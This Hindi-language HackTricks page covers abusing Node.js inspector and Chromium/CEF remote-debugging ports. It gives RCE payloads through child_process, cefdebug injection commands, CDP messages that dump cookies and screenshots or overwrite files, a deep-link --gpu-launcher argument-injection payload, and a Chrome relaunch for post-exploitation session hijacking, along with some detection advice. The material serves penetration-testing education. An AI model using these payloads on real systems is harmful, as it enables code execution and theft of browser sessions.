# Node inspector/CEF debug का दुरुपयोग

{{#include ../../banners/hacktricks-training.md}}

ऐतिहासिक व्यावहारिक उदाहरणों में Multimaster walkthrough और CVE-2019-1414 Visual Studio Code debugger attack शामिल हैं; इन्हें version-specific संदर्भ के रूप में देखें, न कि यह मानकर कि हर मौजूदा Electron या Chromium target में समान primitives उपलब्ध हैं।<sup>[[1]](#references)[[3]](#references)</sup>

## बुनियादी जानकारी

[दस्तावेज़ों से](https://nodejs.org/learn/getting-started/debugging): `--inspect` switch के साथ शुरू होने पर, Node.js process debugging client के लिए listen करता है। **डिफ़ॉल्ट रूप से**, यह host और port **`127.0.0.1:9229`** पर listen करेगा। हर process को एक **unique** **UUID** भी दिया जाता है।<sup>[[4]](#references)</sup>

कनेक्ट करने के लिए inspector clients को host address, port और UUID पता होना चाहिए और इन्हें निर्दिष्ट करना होगा। पूरा URL कुछ इस तरह दिखेगा: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`।<sup>[[4]](#references)</sup>

> [!WARNING]
> चूँकि **debugger को Node.js execution environment का पूरा access होता है**, इस port से कनेक्ट कर सकने वाला malicious actor Node.js process की ओर से मनमाना code execute कर सकता है (**संभावित privilege escalation**)।<sup>[[4]](#references)</sup>

Inspector शुरू करने के कई तरीके हैं:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

जब आप किसी inspected process को शुरू करते हैं, तो कुछ ऐसा दिखाई देगा:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

**CEF** (**Chromium Embedded Framework**) पर आधारित प्रक्रियाएँ `--remote-debugging-port=9222` के साथ debugger expose कर सकती हैं। इससे browser, Node.js inspector के बजाय [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के ज़रिए expose होता है, इसलिए Node.js `process`-आधारित payloads डिफ़ॉल्ट रूप से सीधे लागू नहीं होते।<sup>[[2]](#references)[[5]](#references)</sup>

जब आप debugged browser शुरू करते हैं, तो कुछ ऐसा दिखाई देगा:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### CDP endpoint की enumeration और उसे चलाना

HTTP discovery endpoints **browser** WebSocket को अलग-अलग **target** (tab, worker, extension आदि) WebSockets से अलग पहचानते हैं। Browser endpoint के लिए `/json/version` और targets के लिए `/json/list` query करें; इसके बाद मिले `webSocketDebuggerUrl` values को CDP के JSON-RPC-जैसे messages से सीधे चलाया जा सकता है।<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

उदाहरण के लिए, `websocat "$BROWSER_WS"` से कनेक्ट करें और `{"id":1,"method":"Target.getTargets"}` या `{"id":2,"method":"Storage.getCookies"}` भेजें। पेज target (`websocat "$PAGE_WS"`) पर, `Runtime.evaluate` उस renderer में execute होता है और `Page.captureScreenshot` base64-encoded screenshot लौटाता है। `document.cookie`, `HttpOnly` cookies नहीं दिखा सकता, जबकि `Storage.getCookies` browser से उसका cookie store मांगता है।<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### ब्राउज़र, WebSockets और same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

वेबसाइटें, वेब-ब्राउज़र में खुलने पर, ब्राउज़र सुरक्षा मॉडल के तहत WebSocket और HTTP अनुरोध कर सकती हैं। **एक शुरुआती HTTP कनेक्शन** **एक अद्वितीय debugger session id प्राप्त करने** के लिए आवश्यक है। **same-origin-policy** वेबसाइटों को **यह HTTP कनेक्शन** बनाने से **रोकती है**। [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)** से अतिरिक्त सुरक्षा के लिए,** Node.js यह सत्यापित करता है कि कनेक्शन के **'Host' headers** में या तो **IP address** या ठीक-ठीक **`localhost`** निर्दिष्ट हो।<sup>[[4]](#references)</sup>

> [!TIP]
> **यह सुरक्षा उपाय केवल एक HTTP अनुरोध भेजकर** (जो SSRF vuln का exploit करके किया जा सकता है) **कोड चलाने के लिए inspector का exploit होने से रोकता है**।<sup>[[4]](#references)</sup>

### चल रही प्रक्रियाओं में inspector शुरू करना

आप किसी चल रही nodejs प्रक्रिया को **signal SIGUSR1** भेजकर उसे डिफ़ॉल्ट पोर्ट पर **inspector शुरू** करने के लिए कह सकते हैं। हालांकि, ध्यान दें कि इसके लिए आपके पास पर्याप्त privileges होने चाहिए। इसलिए, इससे आपको **प्रक्रिया के भीतर मौजूद जानकारी तक privileged access** मिल सकता है, लेकिन सीधे privilege escalation नहीं।<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> यह containers में उपयोगी है क्योंकि `--inspect` के साथ **process को बंद करके नया process शुरू करना** **विकल्प नहीं है**, क्योंकि **container** को process के साथ **बंद कर दिया जाएगा**।<sup>[[6]](#references)</sup>

### inspector/debugger से कनेक्ट करें

**Chromium-based browser** से कनेक्ट करने के लिए, Chrome या Edge में क्रमशः `chrome://inspect` या `edge://inspect` URLs खोले जा सकते हैं। Configure बटन पर क्लिक करके यह सुनिश्चित करें कि **target host और port** सही-सही सूचीबद्ध हैं। यह image Remote Code Execution (RCE) का उदाहरण दिखाती है:<sup>[[2]](#references)[[4]](#references)</sup>

![Debugger तक पहुँचने के लिए एक URL दिखाई देगा। जैसे ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger से कनेक्ट करें: Chromium-based browser से कनेक्ट करने के लिए,...](<../../images/image (674).png>)

**command line** का उपयोग करके आप debugger/inspector से इस तरह कनेक्ट कर सकते हैं:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

टूल [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), स्थानीय रूप से चल रहे **inspectors को खोजने** और उनमें **code inject करने** की अनुमति देता है।<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> ध्यान दें कि [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के ज़रिए browser से connect होने पर **NodeJS RCE exploits काम नहीं करेंगे** (इसके साथ करने लायक दिलचस्प चीज़ें ढूँढने के लिए API देखना ज़रूरी है)।<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector में RCE

> [!TIP]
> अगर आप यहाँ यह जानने आए हैं कि [**Electron में XSS से RCE कैसे हासिल करें, तो यह पेज देखें।**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

जब आप Node **inspector** से **connect** कर सकते हैं, तो **RCE** पाने के कुछ आम तरीके इस तरह हैं (लगता है कि ये **Chrome DevTools protocol से connection में काम नहीं करेंगे**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

आप API यहाँ देख सकते हैं: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
इस section में मैं बस उन दिलचस्प चीज़ों की सूची दूँगा जिनका इस्तेमाल लोगों ने इस protocol का exploit करने के लिए किया है।

### Chrome 136+ default-profile restriction

**Chrome 136** से, Chrome `--remote-debugging-port` और `--remote-debugging-pipe` को तब अनदेखा करता है, जब वे **default Chrome data directory** को target करते हैं। इस switch के साथ एक non-standard `--user-data-dir` देना ज़रूरी है। इसकी अलग encryption key और isolated browser state, flag-आधारित सरल technique को उपयोगकर्ता की सामान्य authenticated profile को expose करने से रोकती है। बिना verification के यह नहीं मानना चाहिए कि Chrome-विशिष्ट यह restriction पुराने Chrome builds, Chrome for Testing, Electron/CEF applications या Chromium के अन्य derivatives पर भी लागू होती है।<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

इसलिए, Chrome process को केवल `--remote-debugging-port` के साथ launch होते देखना इस बात का **प्रमाण नहीं** है कि CDP सक्रिय हो गया। listener और `/json/version` की पुष्टि करें, और पता लगाएँ कि वास्तव में कौन-सा profile इसे चलाता है।<sup>[[14]](#references)</sup>

### Deep Links के जरिए Parameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) में, Rhino Security ने पाया कि CEF पर आधारित एक application ने system में एक custom UR**I** (`workspaces://index.html`) register किया था, जो पूरी URI प्राप्त करता था और फिर उस URI से आंशिक रूप से बनाई गई configuration के साथ CEF-आधारित applicatio**n** को launch करता था।<sup>[[8]](#references)</sup>

पता चला कि URI parameters को URL decode करके CEF-आधारित application को launch करने के लिए इस्तेमाल किया जाता था। इससे user command line में **`--gpu-launcher`** flag **inject** करके मनमानी चीज़ें execute कर सकता था।<sup>[[8]](#references)</sup>

इसलिए, ऐसा payload:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

calc.exe निष्पादित करेगा।<sup>[[8]](#references)</sup>

### फ़ाइलों को अधिलेखित करें

वह फ़ोल्डर बदलें जहाँ **डाउनलोड की गई फ़ाइलें सहेजी जाएँगी** और कोई फ़ाइल डाउनलोड करके एप्लिकेशन के अक्सर उपयोग होने वाले **सोर्स कोड** को अपने **दुर्भावनापूर्ण कोड** से **अधिलेखित** करें।<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE and exfiltration

STAR Labs ने दिखाया कि उजागर WebDriver/CDP services से arbitrary file reads और RCE संभव हो सकते हैं; कुछ configurations में DNS rebinding exploit chain को पूरा कर सकता है।<sup>[[9]](#references)</sup>

ChromeDriver की WebDriver service, Chrome DevTools/CDP से अलग है। इसका [`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities) उस browser executable को चुनता है जिसे नए session के लिए launch किया जाएगा। यदि कोई unprivileged caller root के रूप में चल रही ChromeDriver service तक पहुँच सकता है और caller-controlled executable path के साथ session submit कर सकता है, तो वह launch service की privilege boundary पार कर सकता है। खाली `/sessions` response से यह तय नहीं होता कि नए sessions बनाए जा सकते हैं या नहीं। यह निष्कर्ष निकालने से पहले कि इस तरीके का उपयोग संभव है, process owner, listener की वास्तविक पहुँच, session authorization, executable access और confinement की जाँच करें; केवल process name या आम तौर पर इस्तेमाल होने वाला port पर्याप्त नहीं है। [Google की security guidance](https://developer.chrome.com/docs/chromedriver/security-considerations) के अनुसार ChromeDriver को unprivileged account के तहत चलाएँ। Passive enumeration में WebDriver session नहीं बनाना चाहिए।

Browser automation और Chromium security से जुड़े अतिरिक्त ऐतिहासिक मामलों के लिए Counter WebDriver write-up और Project Zero issues 773, 1742 और 1944 देखें।<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### चालू Chromium process के भीतर CDP सक्षम करना

Windows पर, [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) ने दिखाया कि CDP सक्रिय करने का एकमात्र तरीका command-line restriction नहीं है: मौजूदा `msedge.exe` में inject करने में सक्षम code, Chromium के non-exported `content::DevToolsAgentHost::StartRemoteDebuggingServer` को invoke करके और browser को restart किए बिना authenticated live profile को expose कर सकता है।<sup>[[15]](#references)</sup>

दिखाई गई chain में `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` से DLL inject की जाती है, Edge के internal symbols resolve किए जाते हैं (पहले PDBs से और फिर version-specific byte signatures से), browser window को subclass किया जाता है और एक message post किया जाता है, ताकि server शुरू करने वाली अंतिम call browser के **UI thread** पर execute हो। Socket loopback से bind होता है; इसके बाद सामान्य CDP primitives से cookies प्राप्त की जा सकती हैं, tabs capture किए जा सकते हैं, network traffic inspect किया जा सकता है या authenticated pages में JavaScript evaluate किया जा सकता है।<sup>[[15]](#references)</sup>

> [!WARNING]
> यह **post-compromise/process-injection** technique है, unauthenticated network bypass नहीं। यह browser के build पर बहुत निर्भर है, क्योंकि संबंधित C++ symbols export नहीं किए जाते और browser updates के बाद signatures बदल सकती हैं।<sup>[[15]](#references)</sup>

Detection के लिए केवल `--remote-debugging-*` command-line telemetry पर निर्भर न रहें: browser processes के विरुद्ध असामान्य handles और memory operations (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread creation), DLL injection और Chrome/Edge के स्वामित्व वाले unexpected loopback listening sockets को भी correlate करें।<sup>[[15]](#references)</sup>

### Post-Exploitation

किसी वास्तविक environment में, Chromium-based browser इस्तेमाल करने वाले user PC से **compromise करने के बाद**, एक ऐतिहासिक technique थी browser को debugging सक्षम करके दोबारा launch करना और loopback port को forward करना। जिन products/builds में चुनी गई profile अब भी स्वीकार की जाती है, उनमें इससे victim की browsing state उजागर हो सकती है; लेकिन Chrome 136+ में default data directory के लिए यह काम नहीं करेगा।<sup>[[7]](#references)[[14]](#references)</sup>

पुराने/version-specific targets के लिए मूल relaunch command नीचे दी गई है। दूसरी command मौजूदा Chrome का समर्थित तरीका है, लेकिन यह victim की सामान्य authenticated state को दोबारा खोलने के बजाय एक isolated profile बनाती है।<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

macOS-विशिष्ट Chromium relaunch, extension और CDP tradecraft के लिए, [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md) देखें।



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger का निरीक्षण और exploitation टूल](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger के ज़रिए Visual Studio Code में Remote Code Execution](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - शुरुआत करना](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Browsing sessions को दूर से देखने और नियंत्रित करने के लिए Chrome के Debugging Feature का दुरुपयोग](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces में Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [क्या आप मुझसे बात कर रहे हैं? - DNS Rebinding और CDP के ज़रिए WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Bot से RCE तक](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [सुरक्षा बेहतर करने के लिए remote debugging switches में बदलाव - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [चल रहे Edge Browser में CDP inject करना: Runtime Browser Instrumentation की गहन पड़ताल](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
